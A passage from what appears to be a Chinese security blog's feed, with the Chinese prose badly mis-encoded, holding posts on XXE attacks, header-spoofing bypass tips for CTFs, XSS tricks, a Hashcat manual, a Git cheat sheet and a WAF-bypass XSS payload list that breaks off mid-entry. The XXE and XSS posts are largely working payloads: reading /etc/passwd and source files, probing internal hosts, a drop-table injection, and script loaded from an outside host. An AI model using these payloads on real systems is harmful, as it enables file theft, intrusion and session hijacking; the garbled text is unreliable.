å®šä¹‰å¥½çš„ENTITYåœ¨æ–‡æ¡£ä¸­é€šè¿‡â€œ&amp;å®ä½“å;â€æ¥ä½¿ç”¨ã€‚ç±»ä¼¼äºå®å®šä¹‰çš„ä¸€ç§ä¸œè¥¿ã€‚ 0x02 å¨èƒå€ŸåŠ©XXE,æ”»å‡»è€…å¯ä»¥å®ç°ä»»æ„æ–‡ä»¶è¯»å–,DOSæ‹’ç»æœåŠ¡æ”»å‡»ä»¥åŠä»£ç†æ‰«æå†…ç½‘ç­‰. å¯¹äºä¸åŒXMLè§£æå™¨,å¯¹å¤–éƒ¨å®ä½“æœ‰ä¸åŒå¤„ç†è§„åˆ™,åœ¨PHPä¸­é»˜è®¤å¤„ç†çš„å‡½æ•°ä¸º: xml_parseå’Œsimplexml_load xml_parseçš„å®ç°æ–¹å¼ä¸ºexpatåº“ï¼Œé»˜è®¤æƒ…å†µä¸ä¼šè§£æå¤–éƒ¨å®ä½“,è€Œsimplexml_loadé»˜è®¤æƒ…å†µä¸‹ä¼šè§£æå¤–éƒ¨å®ä½“,é€ æˆå®‰å…¨å¨èƒ. é™¤PHPå¤–ï¼Œåœ¨Javaï¼ŒPythonç­‰å¤„ç†xmlçš„ç»„ä»¶åŠå‡½æ•°ä¸­éƒ½å¯èƒ½å­˜åœ¨æ­¤é—®é¢˜. 0x03 è¯­æ³•ä¸¾ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼š &lt;?php $fileread = &lt;&lt;&lt;XML &lt;!-- validators.en.xliff --&gt; &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE dropsec [ &lt;!ELEMENT methodname ANY &gt; &lt;!ENTITY xxe SYSTEM &quot;file://C:/phpStudy/WWW/XXE/file.ext&quot; &gt;]&gt; &lt;methodname&gt;&amp;xxe;&lt;/methodname&gt; XML; $data = simplexml_load_string($fileread); print_r($data); ?&gt; å¦‚æœè¦å¼•ç”¨ä¸€ä¸ªå¤–éƒ¨èµ„æº,å¯ä»¥å€ŸåŠ©å„ç§åè®®ï¼Œè¿™é‡Œé€šè¿‡file:// åè®®å¼•å…¥äº†å¤–éƒ¨å®ä½“. file:///path/to/file.ext http://url/file.ext php://filter/read=convert.base64-encode/resource=conf.php ä¹Ÿå¯è¯»å–ç½‘ç«™å†…å®¹ &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE dropsec [ &lt;!ELEMENT methodname ANY &gt; &lt;!ENTITY xxe SYSTEM &quot;http://byd.dropsec.xyz/robots.txt&quot; &gt;]&gt; &lt;methodname&gt;&amp;xxe;&lt;/methodname&gt; é€šè¿‡ä¸Šé¢å¯ä»¥ç”¨æ¥å†…ç½‘æ¢æµ‹ï¼Œå¦‚æœå®‰è£…äº†expectæ‰©å±•ç»„ä»¶ç”šè‡³å¯ä»¥ç”¨æ¥è¿›è¡Œå†…ç½‘æ¸—é€ã€‚ å¦‚æœåŒ…å«æ–‡ä»¶å¤±è´¥,å¯èƒ½æ˜¯ç”±äºè¯»å–phpç­‰æ–‡ä»¶æ—¶æ–‡ä»¶æœ¬èº«åŒ…å«çš„&lt;ç­‰å­—ç¬¦.å¯ä»¥ä½¿ç”¨Base64ç¼–ç ç»•è¿‡,å¦‚: &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE dropsec [ &lt;!ELEMENT methodname ANY &gt; &lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot; &gt;]&gt; &lt;methodname&gt;&amp;xxe;&lt;/methodname&gt; å†…éƒ¨å®ä½“çš„è¿™æ”¯æŒä¸å¦ä¹Ÿæ˜¯å–å†³äºè§£é‡Šå™¨çš„ã€‚ä¸åŒçš„æµè§ˆå™¨ä¸ä¸€æ ·ï¼Œä¸é€šè¯­è¨€é»˜è®¤ä¹Ÿä¸ä¸€æ ·ã€‚æ‰€ä»¥åˆ©ç”¨æ¯”è¾ƒå›°éš¾ã€‚ ä½†å®é™…ä¸ŠXMLå¤–éƒ¨å®ä½“çš„è§£æï¼Œå’Œphpç‰ˆæœ¬å¹¶æ— å…³ç³»ï¼Œè€Œæ˜¯å’Œç¼–è¯‘æ—¶çš„libxmlåº“ç‰ˆæœ¬æœ‰å…³ã€‚ 0x04 æ”»å‡»1.æ‹’ç»æœåŠ¡ POC 2.å†…ç½‘ä¿¡æ¯ å€ŸåŠ©å„ç§åè®®å¦‚http,XXEå¯ä»¥ååŠ©æ‰«æå†…ç½‘,å¯èƒ½å¯ä»¥è®¿é—®åˆ°å†…ç½‘å¼€æ”¾WEBæœåŠ¡çš„Server,å¹¶è·å–å…¶ä»–ä¿¡æ¯. &lt;!ELEMENT portscan SYSTEM &apos;http://192.168.2.1/&apos; &gt; &lt;!ELEMENT smb SYSTEM &apos;\\192.168.2.1\c$&apos; &gt; &lt;!ELEMENT sql SYSTEM &apos;http://192.168.2.1/index.php?id=1;drop table myweb;#&apos; &gt; 3.æ–‡ä»¶è¯»å– &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE dropsec [ &lt;!ELEMENT methodname ANY &gt; &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt; &lt;methodname&gt;&amp;xxe;&lt;/methodname&gt; 0x05 é˜²å¾¡1ã€å¯¹äºPHP,ç”±äºsimplexml_load_stringå‡½æ•°çš„XMLè§£æé—®é¢˜å‡ºåœ¨libxmlåº“ä¸Š,æ‰€ä»¥å¯ä»¥æå‰åŠ ä¸Š: &lt;?php libxml_disable_entity_loader(true); ?&gt; 2ã€æ£€æŸ¥æ‰€ä½¿ç”¨çš„åº•å±‚xmlè§£æåº“ï¼Œé»˜è®¤ç¦æ­¢å¤–éƒ¨å®ä½“çš„è§£æ. 3ã€å¯¹äºXMLReaderå’ŒDOMæ–¹å¼è§£æ. &lt;?php // with the XMLReader functionality: $doc = XMLReader::xml($badXml,&apos;UTF-8&apos;,LIBXML_NONET); // with the DOM functionality: $dom = new DOMDocument(); $dom-&gt;loadXML($badXml,LIBXML_DTDLOAD|LIBXML_DTDATTR); ?&gt;]]></content>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>XXE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Git å¸¸ç”¨å‘½ä»¤é€ŸæŸ¥è¡¨]]></title>
    <url>%2F2016%2F08%2F15%2FGit%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5%E8%A1%A8%2F</url>
    <content type="text"><![CDATA[Git æ˜¯ç›®å‰ä¸–ç•Œä¸Šæœ€å…ˆè¿›çš„åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼ˆæ²¡æœ‰ä¹‹ä¸€ï¼‰ã€‚Gitæœ‰ä»€ä¹ˆç‰¹ç‚¹ï¼Ÿç®€å•æ¥è¯´å°±æ˜¯ï¼šé«˜ç«¯å¤§æ°”ä¸Šæ¡£æ¬¡ï¼ 0x01 åˆ†æ”¯master: é»˜è®¤å¼€å‘åˆ†æ”¯ Headï¼š é»˜è®¤å¼€å‘åˆ†æ”¯ originï¼š é»˜è®¤è¿œç¨‹ç‰ˆæœ¬åº“ head^ï¼š Headçš„çˆ¶æäº¤ 0x02 åˆ›å»ºç‰ˆæœ¬åº“$ git clone &lt;ur&gt; #å…‹éš†è¿œç¨‹ç‰ˆæœ¬åº“ $ git init #åˆå§‹åŒ–æœ¬åœ°ç‰ˆæœ¬åº“ 0x03 ä¿®æ”¹å’Œæäº¤$ git status #æŸ¥çœ‹çŠ¶æ€ $ git diff #æŸ¥çœ‹å˜æ›´å†…å®¹ $ git add . #è·Ÿè¸ªæ‰€æœ‰æ”¹åŠ¨è¿‡çš„æ–‡ä»¶ $ git add &lt;file&gt; #è·Ÿè¸ªæŒ‡å®šæ–‡ä»¶ $ git mv &lt;old&gt; &lt;new&gt; #æ–‡ä»¶æ”¹å $ git rm &lt;file&gt; #åˆ é™¤æ–‡ä»¶ $ git rm --cached &lt;file&gt; #åœæ­¢è·Ÿè¸ªæ–‡ä»¶ä½†ä¸åˆ é™¤ $ git commit -m &quot;commit message&quot;#æäº¤æ‰€æœ‰æ›´æ–°è¿‡çš„æ–‡ä»¶ $ git commit --amend #ä¿®æ”¹æœ€åä¸€æ¬¡æäº¤ 0x04 æŸ¥çœ‹æäº¤å†å²$ git log #æŸ¥çœ‹æäº¤å†å² $ git log -p &lt;file&gt; #æŸ¥çœ‹æŒ‡å®šæ–‡ä»¶çš„æäº¤å†å² $ git blame &lt;file&gt; #ä»¥åˆ—è¡¨æ–¹å¼æŸ¥çœ‹æŒ‡å®šæ–‡ä»¶çš„æäº¤å†å² 0x05 æ’¤é”€$ git reset --hard HEAD #æ’¤é”€å·¥ä½œç›®å½•ä¸­æ‰€æœ‰æœªæäº¤æ–‡ä»¶çš„ä¿®æ”¹å†…å®¹ $ git checkout HEAD &lt;file&gt; #æ’¤é”€æŒ‡å®šçš„æœªæäº¤æ–‡ä»¶çš„ä¿®æ”¹å†…å®¹ $ git revert &lt;commit&gt; #æ’¤é”€æŒ‡å®šçš„æäº¤ 0x06 åˆ†æ”¯ä¸æ ‡ç­¾$ git branch #æ˜¾ç¤ºæ‰€æœ‰æœ¬åœ°åˆ†æ”¯ $ git checkout &lt;branch/tag&gt; #åˆ‡æ¢åˆ°æŒ‡å®šåˆ†æ”¯æˆ–è€…æ ‡ç­¾ $ git branch &lt;new-nbranch&gt; #åˆ›å»ºæ–°åˆ†æ”¯ $ git branch -d &lt;branch&gt; #åˆ é™¤æœ¬åˆ†æ”¯ $ git tag #åˆ—å‡ºæ‰€æœ‰æœ¬åœ°æ ‡ç­¾ $ git tag &lt;tagname&gt; #åŸºäºæœ€æ–°æäº¤åˆ›å»ºæ ‡ç­¾ $ git tag -d &lt;tagname&gt; #åˆ é™¤æ ‡ç­¾ 0x07 åˆå¹¶ä¸è¡åˆ$ git merge &lt;branch&gt; #åˆå¹¶æŒ‡å®šåˆ†æ”¯åˆ°å½“å‰åˆ†æ”¯ $ git rebase &lt;branch&gt; #è¡åˆæŒ‡å®šåˆ†æ”¯åˆ°å½“å‰åˆ†æ”¯ 0x08 è¿œç¨‹æ“ä½œ$ git remote -v #æŸ¥çœ‹è¿œç¨‹ç‰ˆæœ¬åº“ä¿¡æ¯ $ git remote show &lt;remote&gt; #æŸ¥çœ‹æŒ‡å®šè¿œç¨‹ç‰ˆæœ¬åº“ä¿¡æ¯ $ git remote add &lt;remote&gt; &lt;url&gt; #æ·»åŠ è¿œç¨‹ç‰ˆæœ¬åº“ $ git fetch &lt;remote&gt; #ä»è¿œç¨‹åº“è·å–ä»£ç  $ git pull &lt;remote&gt; &lt;branch&gt; #ä¸‹è½½ä»£ç åŠå¿«é€Ÿåˆå¹¶ $ git push &lt;remote&gt; &lt;branch&gt; #ä¸Šä¼ ä»£ç åŠå¿«é€Ÿåˆå¹¶ $ git push &lt;remote&gt; :&lt;branch/tagname&gt;#åˆ é™¤è¿œç¨‹åˆ†æ”¯æˆ–æ ‡ç­¾ $ git push --tags #ä¸Šä¼ æ‰€æœ‰æ ‡ç­¾]]></content>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTFä¸­ä¸€äº›ç»•è¿‡ç½‘ç«™è®¿é—®é™åˆ¶çš„æŠ€å·§]]></title>
    <url>%2F2016%2F08%2F12%2FCTF%E4%B8%AD%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E7%BD%91%E7%AB%99%E8%AE%BF%E9%97%AE%E9%99%90%E5%88%B6%E7%9A%84%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[å¹³æ—¶è®¿é—®ç½‘ç«™æˆ–è€…åš CTF é¢˜çš„æ—¶å€™ä¼šé‡åˆ°ç½‘ç«™é™åˆ¶è®¿é—®çš„é—®é¢˜ï¼Œä¸‹é¢æ˜¯ä¸€äº›å°æŠ€å·§ï¼Œä¸»è¦æ˜¯é€šè¿‡ BurpSuite æ‹¦æˆª HTTP è¯·æ±‚å¹¶æ ¹æ®éœ€è¦ä¿®æ”¹ HTTP è¯·æ±‚å¤´çš„å†…å®¹æ¥è¾¾åˆ°ç»•è¿‡çš„ç›®çš„ã€‚ 1ã€çœ‹èµ·æ¥åªå…è®¸å›½å¤–è®¿é—®ï¼Œæœ‰å¯èƒ½æ˜¯ HTTP è¯·æ±‚å¤´ä¸­çš„ Accept-Language ä¸ºä¸­æ–‡(cn-zh)ï¼Œä¿®æ”¹ä¸ºè‹±æ–‡(en-us)å³å¯ 2ã€æµè§ˆå™¨ç±»å‹é™åˆ¶ï¼šä¿®æ”¹ HTTP è¯·æ±‚ä¸­çš„ User-Agent 3ã€IPåœ°å€é™åˆ¶ï¼šå¯èƒ½è·Ÿ HTTP è¯·æ±‚å¤´ä¸­çš„ X-Forwarded-Forã€client-ipã€remote_addr æœ‰å…³ï¼Œæˆ–è€…æŒ‚ä»£ç†ã€‚ 4ã€éœ€è¦ç™»å½•ï¼Œå¯èƒ½æ˜¯ Cookie çš„é—®é¢˜ï¼Œå¦‚æœ Cookie æ¯”è¾ƒç®€å•ï¼Œè¯•è¯•èƒ½ä¸èƒ½æ„é€ ã€‚ 5ã€å°è¯•æŸ¥çœ‹ robots.txt å¯ä»¥è·å¾—è¯¥ç½‘ç«™çš„ä¸€äº›ä¿¡æ¯ã€‚ 6ã€æœ‰ä¸€äº›åŠ refereråŠ ä¸Šä»£ç†ipã€‚]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>WAFç»•è¿‡</tag>
        <tag>çˆ¬è™«</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSSä¸€äº›å°æŠ€å·§]]></title>
    <url>%2F2016%2F08%2F12%2FXSS%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[1ã€http://www.wooyun.org/bugs/wooyun-2013-034003 &lt;textarea/&gt;&quot;&gt;&lt;img src=1 onerror=&quot;with(document)body.appendChild(createElement(String.fromCharCode(115,99,114,105,112,116))).src=&apos;//pxss.sinaapp.com/l6OBji&apos;&quot;&gt; &lt;textarea/&gt;&lt;iframe src=http://www.baidu.com/&gt;&lt;/iframe&gt; 2ã€åªæœ‰æ•°æ®åŒ…ä¸­httpå¤´å«æœ‰X-XSS-Protectionå¹¶ä¸”å€¼ä¸º0çš„æ—¶å€™ï¼Œæµè§ˆå™¨æ‰ä¸ä¼šå¼€å¯xss filterã€‚ 3ã€å¯ä»¥åˆ©ç”¨å­—ç¬¦ç¼–ç æ¥ç»•è¿‡XSS Filterçš„æ–¹æ³•ï¼Œå½“ç¼–ç æ˜¯is-2022-kræ—¶æµè§ˆå™¨ä¼šå¿½ç•¥%0fï¼Œè¿™æ ·æˆ‘ä»¬åœ¨onerroråé¢åŠ ä¸ª%0få°±èƒ½ç»•è¿‡filterï¼Œå‰ææ˜¯æ³¨å…¥ä¸€ä¸ª&lt;meta charset=ISO-2022-KR&gt; 4ã€&lt;iframe srcdoc=&#39;&lt;script&gt;alert(1)&lt;/script&gt;&#39;&gt; ä¸æ˜¯ä»¥onå¼€å¤´çš„ åˆå¯ä»¥æ‰§è¡ŒJSçš„iframeå±æ€§ã€‚ 5ã€ &lt;a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=&gt;aa&lt;/a&gt; 6ã€ &lt;a href=javascirpt:alert(1)&gt;è¯·ç‚¹å‡»&lt;/a&gt; 7ã€ &lt;iframe/onload=alert(1)&gt; 8ã€ &lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgiWHNzVGVzdCIpOzwvc2NyaXB0Pg==&quot;&gt;&lt;/object&gt; 9ã€ä¸€äº›æœ‰è¶£çš„XSS Vector http://zone.wooyun.org/content/15121]]></content>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>XSS</tag>
        <tag>WAFç»•è¿‡</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HashCatä½¿ç”¨æ‰‹å†Œ]]></title>
    <url>%2F2016%2F08%2F10%2FHashCat%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C%2F</url>
    <content type="text"><![CDATA[0x00 èƒŒæ™¯Hashcatæ˜¯ä¸€ä¸ªå·²ç»æœ‰è´´è¿‘å®Œç¾çš„å·¥ä½œå·¥å…·ï¼Œæ”¯æŒåƒâ€œPasswordsProâ€ï¼Œâ€œçº¦ç¿°å¼€è†›æ‰‹â€åŸºäºè§„åˆ™çš„æ”»å‡»ã€‚ç„¶è€Œï¼Œå¯¹äºä¸€äº›æœªçŸ¥çš„åŸå› ï¼Œä»–ä»¬ä¸¤ä¸ªä¸æ”¯æŒå¤šçº¿ç¨‹ã€‚è¿™æ˜¯å†™Hashcatçš„å”¯ä¸€ç†ç”±ï¼šä¸ºäº†åˆ©ç”¨ç°ä»£CPUçš„å¤šä¸ªæ ¸å¿ƒã€‚ 0x01 ç®€ä»‹Hashcatæœ‰ä¸¤ä¸ªä¸»è¦çš„å˜ç§ï¼š 1.Hashcat åŸºäºCPUçš„å¯†ç æ¢å¤å·¥å…· 2.oclHashcat/cudaHashcat ä¸€ä¸ªGPUåŠ é€Ÿå·¥å…· è®¸å¤šç”±Hashcatæ”¯æŒçš„ç®—æ³•å¯ä»¥åœ¨æ›´çŸ­çš„æ—¶é—´ï¼Œé€šè¿‡ä½¿ç”¨è¯æ®å……åˆ†çš„GPUåŠ é€Ÿè¢«ç ´è§£åœ¨oclHashcatï¼ˆå¦‚MD5ï¼ŒSHA1ï¼Œç­‰ç­‰ï¼‰åˆ©ç”¨ã€‚ç„¶è€Œï¼Œå¹¶éæ‰€æœ‰çš„ç®—æ³•å¯ä»¥é€šè¿‡åˆ©ç”¨GPUçš„åŠ é€Ÿã€‚Bcryptå°±æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„ä¾‹å­ã€‚ç”±äºç§ç§å› ç´ ï¼Œæ¯”å¦‚ä¾èµ–äºæ•°æ®çš„åˆ†æ”¯ï¼Œåºåˆ—åŒ–å’Œå†…å­˜ï¼ˆä»¥ä»…ä¸¾å‡ ä¾‹ï¼‰ï¼ŒoclHashcatä¸æ˜¯ä¸€ä¸ªåŒ…ç½—ä¸‡è±¡çš„æ›¿ä»£Hashcatã€‚ä½¿ç”¨çš„è¯ï¼Œä½ç‰ˆæœ¬æç¤ºç‰ˆæœ¬è¿‡ä½çš„è¯ï¼Œæ”¹ä¸€ä¸‹æ—¶é—´å°±è¡Œäº†ï¼‰ä½¿ç”¨Hashcatæ²¡æœ‰ä»»ä½•é™åˆ¶ï¼Œä½¿ç”¨oclhashcatåˆ™å¿…é¡»æ»¡è¶³AMDï¼ˆçš„OpenCLï¼‰å’ŒNvidiaï¼ˆCUDAï¼‰ã€‚ 0x02 ç‰¹æ€§ Hashcatå¯ç”¨äºLinuxï¼ŒOSXå’ŒWindowsã€‚oclHashcatä»…é€‚ç”¨äºLinuxå’ŒWindows ä¸–ç•Œæœ€å¿«çš„å¯†ç ç ´è§£ ä¸–ç•Œç¬¬ä¸€ä¸ªä¹Ÿæ˜¯å”¯ä¸€åŸºäºGPUè§„åˆ™å¼•æ“ è‡ªç”± å¼€æº å¤šGPUï¼ˆé«˜è¾¾128 GPUï¼‰çš„ å¤šæ•£åˆ—ï¼ˆé«˜è¾¾1äº¿æ•£åˆ—ï¼‰ å¤šæ“ä½œç³»ç»Ÿï¼ˆLinuxå’ŒWindowsæœ¬åœ°äºŒè¿›åˆ¶æ–‡ä»¶ï¼‰ å¤šå¹³å°ï¼ˆOpenCLå’ŒCUDAæ”¯æŒï¼‰ å¤šç®—æ³•ä¸­ï¼ˆè§ä¸‹æ–‡ï¼‰ èµ„æºåˆ©ç”¨ç‡ä½ï¼Œä½ ä»ç„¶å¯ä»¥çœ‹ç”µå½±æˆ–ç©æ¸¸æˆè€Œç ´è£‚ é«˜åº¦é›†ä¸­è¿­ä»£ç°ä»£å“ˆå¸Œ åŸºäºé‡ç‚¹å­—å…¸æ”»å‡» æ”¯æŒåˆ†å¸ƒå¼å¼€è£‚ æ”¯æŒæš‚åœ / æ¢å¤è€Œå¼€è£‚ æ”¯æŒä¼šè¯ æ”¯æŒæ¢å¤ æ”¯æŒè¯»å–å•è¯æ–‡ä»¶ æ”¯æŒè¯»å–å­—æ ‡å‡†è¾“å…¥ æ”¯æŒå…­è§’ç› æ”¯æŒåå…­è¿›åˆ¶å­—ç¬¦é›† å†…ç½®åŸºå‡†ç³»ç»Ÿ ç»¼åˆçƒ­çœ‹é—¨ç‹— 150+ç®—æ³•åœ¨è€ƒè™‘æ€§èƒ½çš„å®ç° 0x04 ä½¿ç”¨è¯´æ˜ç ´è§£çš„hashç±»å‹ä½¿ç”¨ â€“help æŸ¥çœ‹ç ´è§£ç±»å‹ 900 = MD4 0 = MD5 5100 = Half MD5 100 = SHA1 10800 = SHA-384 1400 = SHA-256 1700 = SHA-512 5000 = SHA-3(Keccak) 10100 = SipHash 6000 = RipeMD160 6100 = Whirlpool 6900 = GOST R 34.11-94 11700 = GOST R 34.11-2012 (Streebog) 256-bit 11800 = GOST R 34.11-2012 (Streebog) 512-bit 10 = md5($pass.$salt) 20 = md5($salt.$pass) 30 = md5(unicode($pass).$salt) 40 = md5($salt.unicode($pass)) 3800 = md5($salt.$pass.$salt) 3710 = md5($salt.md5($pass)) 2600 = md5(md5($pass) 4300 = md5(strtoupper(md5($pass))) 4400 = md5(sha1($pass)) 110 = sha1($pass.$salt) 120 = sha1($salt.$pass) 130 = sha1(unicode($pass).$salt) 140 = sha1($salt.unicode($pass)) 4500 = sha1(sha1($pass) 4700 = sha1(md5($pass)) 4900 = sha1($salt.$pass.$salt) 1410 = sha256($pass.$salt) 1420 = sha256($salt.$pass) 1430 = sha256(unicode($pass).$salt) 1440 = sha256($salt.unicode($pass)) 1710 = sha512($pass.$salt) 1720 = sha512($salt.$pass) 1730 = sha512(unicode($pass).$salt) 1740 = sha512($salt.unicode($pass)) ç ´è§£æ–¹å¼0 = Straight #ç›´æ¥å­—å…¸ç ´è§£ 1 = Combination #ç»„åˆç ´è§£ 2 = Toggle-Case #åˆ‡æ¢ä¸åŒæ–‡ä»¶ç ´è§£ 3 = Brute-force #æ©ç æš´åŠ›ç ´è§£ 4 = Permutation #ç½®æ¢ç»„åˆç ´è§£ 5 = Table-Lookup #æŸ¥è¡¨ç ´è§£ 8 = Prince å‚æ•°è¯´æ˜General: -m, --hash-type=NUM hashç±»å‹ï¼Œå¼•ç”¨ä¸Šæ–‡æ•°å­— -a, --attack-mode=NUM æ”»å‡»ç±»å‹ï¼Œå¼•ç”¨ä¸Šæ–‡æ•°å­— -V, --version ç‰ˆæœ¬ -h, --help å¸®åŠ©æ–‡æ¡£ --quiet Suppress output Misc: --hex-salt ä»¥åå…­è¿›åˆ¶ç»™å‡º --hex-charset ä»¥å­—ç¬¦é›†ç»™å‡º --runtime=NUM è¿è¡Œnumæ—¶é—´åç»ˆæ­¢ --status å¯ç”¨çŠ¶æ€ --status-timer=NUM å®šæ—¶å™¨ --status-automat çŠ¶æ€ Built-in charsets: #è‡ªå®šä¹‰å­—ç¬¦é›† ?l = abcdefghijklmnopqrstuvwxyz ?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ ?d = 0123456789 ?s = !&quot;#$%&amp;&apos;()*+,-./:;&lt;=&gt;?@[\]^_`{|}~ ?a = ?l?u?d?s ?b = 0x00 - 0xff FIile: -oï¼Œ--outfile =æ–‡ä»¶ä¸­å®šä¹‰OUTFILEå·²æ¢å¤å“ˆå¸Œ --outfileæ ¼å¼= NUMå®šä¹‰æ¢å¤çš„æ•£åˆ—OUTFILEæ ¼å¼ï¼Œè¯·å‚é˜…ä¸‹é¢å¼•ç”¨ --outfile-autohex-Disableç¦æ­¢ä½¿ç”¨$ HEX []è¾“å‡ºå¹³åŸ -pï¼Œ--separator = CHARå®šä¹‰hashlists / outfileä¸­åˆ†ç¦»ç‚­ --showæ˜¾ç¤ºå¯†ç ç ´è§£åªï¼ˆè§--usernameï¼‰ --leftåªï¼ˆè§--usernameï¼‰æ˜¾ç¤ºæœªå¼€è£‚çš„å¯†ç  --usernameå¯ç”¨hashfileç”¨æˆ·åå¿½ç•¥ï¼ˆæ¨èï¼šä¹Ÿä½¿ç”¨--showï¼‰ ä¸€æ—¦å®ƒè¢«ç ´è§£--removeå¯ç”¨å“ˆå¸Œåˆ é™¤ --stdoutæ ‡å‡†è¾“å‡ºæ¨¡å¼ --potfileï¼Œç¦æ­¢ä¸å†™potfile --debugæ¨¡å¼= NUMï¼ˆä»…é€‚ç”¨äºé€šè¿‡ä½¿ç”¨è§„åˆ™çš„æ··åˆï¼‰å®šä¹‰è°ƒè¯•æ¨¡å¼ï¼Œ è§ä¸‹é¢çš„å‚è€ƒèµ„æ–™ --debugæ–‡ä»¶=è°ƒè¯•è§„åˆ™æ–‡ä»¶çš„è¾“å‡ºæ–‡ä»¶ï¼ˆè§--debugæ¨¡å¼ï¼‰ -eï¼Œ--salt-file =æ–‡ä»¶ç›ï¼Œæ–‡ä»¶æ— ç›hashlists Increment: -i, --increment --increment-min=NUM æœ€å°å€¼ --increment-max=NUM æœ€å¤§å€¼ 0x05 å…·ä½“æ“ä½œä½¿ç”¨å­—å…¸è¿›è¡Œç ´è§£ä½¿ç”¨ç»™çš„å­—å…¸å’Œhashè¿›è¡Œç ´è§£ Hashcat.exe -m 500 example500.hash example.dict cudaHashcat32.exe -m 500 example500.hash example.dict &gt;result.txt ä½¿ç”¨æ©ç è¿›è¡Œç ´è§£48E231E66FF8943DB0F6D2B6CB6536D2ï¼ˆxiaoming123456ï¼‰?l?l?l?l?l?l?l?l?d?d?d?d?d?d hashcat.exe -m 0 -a 3 48E231E66FF8943DB0F6D2B6CB6536D2 ?l?l?l?l?l?l?l?l?d?d?d?d?d?d HashCatå‚æ•°ä¼˜åŒ–HashCatæœ¬èº«è€ƒè™‘åˆ°ç³»ç»Ÿèµ„æºçš„åˆ†é…ï¼Œé»˜è®¤å‚æ•°ä¸‹å¹¶æ²¡æœ‰æœ€å¤§åŒ–çš„æ¥ä½¿ç”¨ç¡¬ä»¶èµ„æºã€‚å¦‚æœæˆ‘ä»¬æƒ³è¦è®©ç ´è§£é€Ÿåº¦æœ€å¤§åŒ–ï¼Œå°±éœ€è¦å¯¹ä¸€äº›å‚æ•°è¿›è¡Œé…ç½®ã€‚ Workload tuning è´Ÿè½½è°ƒä¼˜ã€‚è¯¥å‚æ•°æ”¯æŒçš„å€¼æœ‰1,8,40,80,160 --gpu-accel 160 å¯ä»¥è®©GPUå‘æŒ¥æœ€å¤§æ€§èƒ½ã€‚ Gpu loops è´Ÿè½½å¾®è°ƒè¯¥å‚æ•°æ”¯æŒçš„å€¼çš„èŒƒå›´æ˜¯8-1024ï¼ˆæœ‰äº›ç®—æ³•åªæ”¯æŒåˆ°1000ï¼‰ã€‚ --gpu-loops 1024 å¯ä»¥è®©GPUå‘æŒ¥æœ€å¤§æ€§èƒ½ã€‚ Segment size å­—å…¸ç¼“å­˜å¤§å°è¯¥å‚æ•°æ˜¯è®¾ç½®å†…å­˜ç¼“å­˜çš„å¤§å°ï¼Œä½œç”¨æ˜¯å°†å­—å…¸æ”¾å…¥å†…å­˜ç¼“å­˜ä»¥åŠ å¿«å­—å…¸ç ´è§£é€Ÿåº¦ï¼Œé»˜è®¤ä¸º32MBï¼Œå¯ä»¥æ ¹æ®è‡ªèº«å†…å­˜æƒ…å†µè¿›è¡Œè®¾ç½®ï¼Œå½“ç„¶æ˜¯è¶Šå¤§è¶Šå¥½XDã€‚ --segment-size 512 å¯ä»¥æé«˜å¤§å­—å…¸ç ´è§£çš„é€Ÿåº¦ã€‚]]></content>
      <tags>
        <tag>çˆ†ç ´</tag>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>Hashcat</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS payload]]></title>
    <url>%2F2016%2F08%2F05%2FXSS-payload%2F</url>
    <content type="text"><![CDATA[æ”¶é›†çš„ä¸€äº›æ¯”è¾ƒæœ‰ç”¨çš„XSS payloadï¼Œç”¨äºç»•è¿‡wafåŠä¸€äº›åº”ç”¨ç¨‹åºï¼Œå…·ä½“çš„åˆ†ç±»å°±ä¸è¯´äº†ï¼Œä¸€çœ‹å°±æ˜ç™½çš„ã€‚ &lt;sCrIpt&gt;alert(1)&lt;/ScRipt&gt; \&lt;iMg srC=1 lAnGuAGE=VbS oNeRroR=mSgbOx(1)&gt; &lt;img src=&apos;1&apos; onerror\x00=alert(0) /&gt; &lt;img src=&apos;1&apos; onerror/=alert(0) /&gt; &lt;img src=&apos;1&apos; onerror\x0b=alert(0) /&gt; &lt;img src=&apos;1&apos; onerror=\x00alert(0) /&gt; &lt;\x00img src=&apos;1&apos; onerror=alert(0) /&gt; &lt;script\x00&gt;alert(1)&lt;/script&gt; &lt;i\x00mg src=&apos;1&apos; onerror=alert(0) /&gt; &lt;img/src=&apos;1&apos;/onerror=alert(0)&gt; &lt;img\x0bsrc=&apos;1&apos;\x0bonerror=alert(0)&gt; &lt;img src=&apos;1&apos;&apos;onerror=&apos;alert(0)&apos;&gt; &lt;img src=&apos;1&apos;&quot;onerror=&quot;alert(0)&quot;&gt; &lt;img src=&apos;1&apos;\x00onerror=alert(0)&gt; &lt;img src=&apos;1&apos;onerror=alert(0)&gt; Firefox (\x09, \x0a, \x0d, \x20) Chrome (Any character \x01 